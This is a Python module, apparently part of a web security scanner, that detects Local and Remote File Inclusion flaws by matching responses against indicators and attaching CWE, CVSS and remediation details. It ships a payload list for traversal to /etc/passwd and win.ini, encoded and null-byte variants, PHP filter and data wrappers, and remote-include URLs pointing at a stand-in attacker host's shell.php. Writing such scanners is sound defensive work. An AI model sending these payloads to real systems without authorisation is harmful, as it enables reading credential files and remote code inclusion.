"""
File Inclusion vulnerability detector (LFI/RFI)
Detects Local File Inclusion and Remote File Inclusion vulnerabilities
"""

import re
from typing import List, Dict, Any, Tuple

class FileInclusionDetector:
    """File Inclusion vulnerability detection logic"""
    
    @staticmethod
    def get_lfi_indicators() -> List[str]:
        """Get Local File Inclusion indicators"""
        return [
            # Linux/Unix system files
            'root:x:0:0:',
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/version',
            '/proc/self/environ',
            
            # Windows system files
            'boot.ini',
            'win.ini',
            'system.ini',
            '[boot loader]',
            '[operating systems]',
            
            # Common application files
            '<?php',
            'include(',
            'require(',
            'include_once(',
            'require_once(',
            
            # Error messages
            'failed to open stream',
            'No such file or directory',
            'Permission denied',
            'include_path=',
            'open_basedir restriction'
        ]
    
    @staticmethod
    def get_rfi_indicators() -> List[str]:
        """Get Remote File Inclusion indicators"""
        return [
            # Remote execution indicators
            'allow_url_include',
            'allow_url_fopen',
            'Warning: include(',
            'Warning: require(',
            'failed to open stream: HTTP request failed',
            'HTTP wrapper does not support writeable connections',
            
            # Remote content indicators
            'HTTP/1.1 200 OK',
            'Content-Type: text/html',
            'Server: Apache',
            'Server: nginx'
        ]
    
    @staticmethod
    def detect_file_inclusion(payload: str, response_text: str, response_code: int) -> Tuple[bool, str, str, Dict[str, Any]]:
        """Enhanced file inclusion detection"""
        if response_code not in [200, 201, 202, 500, 400, 403]:
            return False, "", "", {}
        
        # Check for LFI indicators
        lfi_indicators = FileInclusionDetector.get_lfi_indicators()
        found_lfi = []
        
        for indicator in lfi_indicators:
            if indicator.lower() in response_text.lower():
                found_lfi.append(indicator)
        
        if found_lfi:
            evidence = f"Local File Inclusion detected. Found indicators: {', '.join(found_lfi[:3])}"
            return True, evidence, "Critical", {
                'cwe': 'CWE-22',
                'cvss': '9.1',
                'owasp': 'A01:2021 – Broken Access Control',
                'recommendation': 'Use whitelist validation for file parameters. Avoid direct file inclusion based on user input.'
            }
        
        # Check for RFI indicators
        rfi_indicators = FileInclusionDetector.get_rfi_indicators()
        found_rfi = []
        
        for indicator in rfi_indicators:
            if indicator.lower() in response_text.lower():
                found_rfi.append(indicator)
        
        if found_rfi:
            evidence = f"Remote File Inclusion detected. Found indicators: {', '.join(found_rfi[:3])}"
            return True, evidence, "Critical", {
                'cwe': 'CWE-98',
                'cvss': '9.8',
                'owasp': 'A03:2021 – Injection',
                'recommendation': 'Disable allow_url_include and allow_url_fopen. Use whitelist validation for file parameters.'
            }
        
        # Check for directory traversal patterns
        traversal_patterns = [
            r'\.\./',
            r'\.\.\\',
            r'%2e%2e%2f',
            r'%2e%2e%5c'
        ]
        
        for pattern in traversal_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                if FileInclusionDetector._check_traversal_success(response_text):
                    return True, f"Directory traversal detected with pattern: {pattern}", "High", {
                        'cwe': 'CWE-22',
                        'cvss': '7.5',
                        'owasp': 'A01:2021 – Broken Access Control',
                        'recommendation': 'Sanitize file path parameters and use absolute paths.'
                    }
        
        return False, "", "", {}
    
    @staticmethod
    def _check_traversal_success(response_text: str) -> bool:
        """Check if directory traversal was successful"""
        success_indicators = [
            'root:x:0:0:',
            '[boot loader]',
            '<?php',
            'include(',
            'require(',
            '/etc/passwd',
            'boot.ini'
        ]
        
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    @staticmethod
    def get_file_inclusion_payloads() -> List[str]:
        """Get file inclusion test payloads"""
        return [
            # Basic LFI payloads
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            'C:\\windows\\win.ini',
            
            # Encoded payloads
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
            
            # Null byte payloads
            '../../../etc/passwd%00',
            '..\\..\\..\\windows\\win.ini%00',
            
            # PHP wrapper payloads
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            
            # RFI payloads
            'http://127.0.0.1/evil.txt',
            'https://attacker.com/shell.php',
            'ftp://attacker.com/shell.php'
        ]
